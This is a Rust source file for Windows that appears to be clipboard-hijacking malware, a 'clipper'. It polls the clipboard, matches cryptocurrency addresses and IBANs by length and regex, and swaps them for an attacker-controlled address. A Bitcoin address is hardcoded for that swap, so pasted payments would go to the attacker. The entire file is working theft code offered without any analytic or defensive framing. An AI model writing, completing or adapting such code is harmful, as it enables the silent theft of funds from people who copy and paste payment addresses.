use regex::Regex;

// sry for awful code lol coded this a while ago

use once_cell::sync::OnceCell;
use std::{collections::HashMap, sync::Mutex};

use std::ptr;
use winapi::um::winbase::GlobalSize;
use winapi::um::winbase::{GlobalAlloc, GlobalFree, GlobalLock, GlobalUnlock, GMEM_MOVEABLE};
use winapi::um::winuser::{
    CloseClipboard, GetClipboardData, OpenClipboard, SetClipboardData, CF_UNICODETEXT,
};
fn copy_to_clipboard(text: &str) {
    // thx stackoverflow :joy:

    unsafe {
        let mut text_utf16: Vec<u16> = text.encode_utf16().collect();
        // And zero-terminated before passing it into `SetClipboardData`
        text_utf16.push(0);
        // Allocate memory
        let hglob = GlobalAlloc(GMEM_MOVEABLE, text_utf16.len() * std::mem::size_of::<u16>());
        // Retrieve writeable pointer to memory
        let dst = GlobalLock(hglob);
        // Copy data
        ptr::copy_nonoverlapping(text_utf16.as_ptr(), dst as _, text_utf16.len());
        // Release writeable pointer
        GlobalUnlock(hglob);

        // Everything is set up now, let's open the clipboard
        OpenClipboard(ptr::null_mut());
        // And apply data
        SetClipboardData(CF_UNICODETEXT, hglob);

        // Clean up
        GlobalFree(hglob);
        CloseClipboard();
    }
    // Needs to be UTF-16 encoded
}

pub fn get() -> Result<String, std::io::Error> {
    unsafe {
        // get clipboard data
        OpenClipboard(ptr::null_mut());
        let clipboard_data = GetClipboardData(CF_UNICODETEXT);
        if clipboard_data == ptr::null_mut() {
            return Err("Clipboard data is null").unwrap();
        }
        let size = GlobalSize(clipboard_data);
        let mut res = Vec::with_capacity(size as usize);
        let data = GlobalLock(clipboard_data);
        res.set_len(size as usize);
        ptr::copy_nonoverlapping(data as _, res.as_mut_ptr(), size as usize);
        GlobalUnlock(data);
        CloseClipboard();

        // get the normal string

        let re = Regex::new(r"[^a-zA-Z0-9]").unwrap();

        let mut res = String::from_utf8(res).unwrap().to_string();

        res = re.replace_all(&res, "").to_string();

        Ok(res)
    }
}

pub fn clipper() {
    let mut prev_content = String::new();
    let mut clipboard: String = String::new();

    loop {
        let result = get();

        if result.is_ok() {
            clipboard = result.unwrap();

            if !(clipboard == prev_content) {

                // User has copied something new
                let has_addr = has_address(&clipboard);
                if has_addr.len() > 0 {
                    let addr = replace_address(has_addr);
                }
            }
        } else {
            std::thread::sleep(std::time::Duration::from_millis(1000)); // sleep longer if error
        }

        std::thread::sleep(std::time::Duration::from_millis(250));
    }
}

fn replaced() -> &'static Mutex<HashMap<&'static str, &'static str>> {
    static INSTANCE: OnceCell<Mutex<HashMap<&'static str, &'static str>>> = OnceCell::new();
    INSTANCE.get_or_init(|| {
        let mut hm = HashMap::new();
        hm.insert("XMR", "");
        hm.insert("BNB", "");
        hm.insert("TRX", "");
        hm.insert("ETH", "");
        hm.insert("BTC", "17CoSbqEDELfNjUx2i6GrAm3tzfw7ggfAf");
        hm.insert("DOGE", "");
        hm.insert("BCH", "");
        hm.insert("LTC", "");
        hm.insert("DASH", "");
        hm.insert("XRP", "");
        hm.insert("ADA", "");
        hm.insert("TON", "");
        hm.insert("NEO", "");
        hm.insert("ETC", "");
        hm.insert("SOL", "");
        hm.insert("ZEC", "");
        hm.insert("ALGO", "");
        hm.insert("XLM", "");
        hm.insert("IBAN", "");
        Mutex::new(hm)
    })
}

pub fn replace_address(crypto: &str) -> String{
    if replaced().lock().unwrap().get(crypto).unwrap().len() < 1 {
        return String::new();
    }


    let _ = copy_to_clipboard(replaced().lock().unwrap().get(crypto).unwrap());
    crypto.to_string()
}   

pub fn has_address(address: &str) -> &str {
    if address.len() == 95 && address.chars().next().unwrap() == '4' {
        return "XMR";
    }

    if address.len() == 42 && address.starts_with("bnb1") {
        return "BNB";
    }

    if address.len() == 34 && address.chars().next().unwrap() == 'T' {
        return "TRX";
    }

    if address.len() == 42 && address.starts_with("0x3f") {
        return "ETC";
    }

    if address.len() == 42 && address.starts_with("0x") {
        return "ETH";
    }

    if address.len() == 35 && address.starts_with("t1") {
        return "ZEC";
    }

    if (address.len() == 42 && address.starts_with("bc1"))
        || (address.len() == 34 && address.starts_with("1"))
        || (address.len() == 34 && address.starts_with("3"))
    {
        return "BTC";
    }

    if (address.len() == 48) && (address.contains("-") || address.contains("_")) {
        return "TON";
    }

    if address.len() == 58 && Regex::new("[A-Z2-7]{58}").unwrap().is_match(address) {
        return "ALGO";
    }

    if address.len() == 56
        && address.starts_with("G")
        && Regex::new("[A-Z2-7]{58}")
            .unwrap()
            .is_match(&(address.to_owned() + "AA"))
    {
        return "XLM";
    }

    let mut regexes = HashMap::new();
    regexes.insert("DOGE", "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$");
    regexes.insert("BCH", "^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$");
    regexes.insert("LTC", "(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
    regexes.insert("DASH", "^X[1-9A-HJ-NP-Za-km-z]{33}$");
    regexes.insert("XRP", r"\br[0-9a-zA-Z]{24,34}\b");
    regexes.insert("ADA", "^D[A-NP-Za-km-z1-9]{35,}$");
    regexes.insert("NEO", "(?:^A[0-9a-zA-Z]{33}$)");
    regexes.insert("SOL", "(^[1-9A-HJ-NP-Za-km-z]{32,44}$)");
    regexes.insert(
        "IBAN",
        "[a-zA-Z]{2}[0-9]{2}[a-zA-Z0-9]{4}[0-9]{7}([a-zA-Z0-9]?){0,16}",
    );

    for (coin, regex) in regexes.iter() {
        if Regex::new(regex).unwrap().is_match(address) {
            return coin;
        }
    }

    ""
}
